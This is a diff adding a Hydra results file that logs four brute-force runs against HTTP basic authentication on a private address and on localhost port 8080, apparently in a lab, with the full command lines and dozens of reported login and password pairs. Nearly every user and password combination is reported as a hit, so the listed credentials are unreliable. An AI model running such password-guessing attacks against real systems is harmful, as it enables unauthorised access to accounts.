@@ -1,0 +1,34 @@
+# Hydra v9.7 run at 2026-11-10 07:26:17 on 172.28.20.10 http-get (hydra -L users.txt -P pass.txt -V -t 4 -o hydra_results.txt 172.28.20.10 http-get /)
+# Hydra v9.7 run at 2026-11-10 07:31:44 on 127.0.0.1 http-get (hydra -L users.txt -P pass.txt -s 8080 -V -t 4 -o hydra_results.txt 127.0.0.1 http-get /)
+# Hydra v9.7 run at 2026-11-10 07:37:55 on 127.0.0.1 http-get (hydra -L users.txt -P pass.txt -s 8080 -V -t 4 -o hydra_results.txt 127.0.0.1 http-get /)
+[8080][http-get] host: 127.0.0.1   login: admin   password: 123456
+[8080][http-get] host: 127.0.0.1   login: admin   password: admin123
+[8080][http-get] host: 127.0.0.1   login: admin   password: hacked_world
+[8080][http-get] host: 127.0.0.1   login: system_cc   password: 123456
+[8080][http-get] host: 127.0.0.1   login: admin   password: password
+[8080][http-get] host: 127.0.0.1   login: system_cc   password: password
+[8080][http-get] host: 127.0.0.1   login: guest   password: 123456
+[8080][http-get] host: 127.0.0.1   login: guest   password: hacked_world
+[8080][http-get] host: 127.0.0.1   login: guest   password: password
+[8080][http-get] host: 127.0.0.1   login: guest   password: admin123
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: password
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: 123456
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: admin123
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: hacked_world
+# Hydra v9.7 run at 2026-11-10 08:03:29 on 127.0.0.1 http-get (hydra -L users.txt -P pass.txt -s 8080 -V -t 4 -o hydra_results.txt 127.0.0.1 http-get /)
+[8080][http-get] host: 127.0.0.1   login: admin   password: hacked_world
+[8080][http-get] host: 127.0.0.1   login: admin   password: 123456
+[8080][http-get] host: 127.0.0.1   login: admin   password: password
+[8080][http-get] host: 127.0.0.1   login: admin   password: admin123
+[8080][http-get] host: 127.0.0.1   login: system_cc   password: 123456
+[8080][http-get] host: 127.0.0.1   login: system_cc   password: password
+[8080][http-get] host: 127.0.0.1   login: system_cc   password: admin123
+[8080][http-get] host: 127.0.0.1   login: system_cc   password: hacked_world
+[8080][http-get] host: 127.0.0.1   login: guest   password: 123456
+[8080][http-get] host: 127.0.0.1   login: guest   password: password
+[8080][http-get] host: 127.0.0.1   login: guest   password: hacked_world
+[8080][http-get] host: 127.0.0.1   login: guest   password: admin123
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: 123456
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: password
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: admin123
+[8080][http-get] host: 127.0.0.1   login: altimit_adm   password: hacked_world
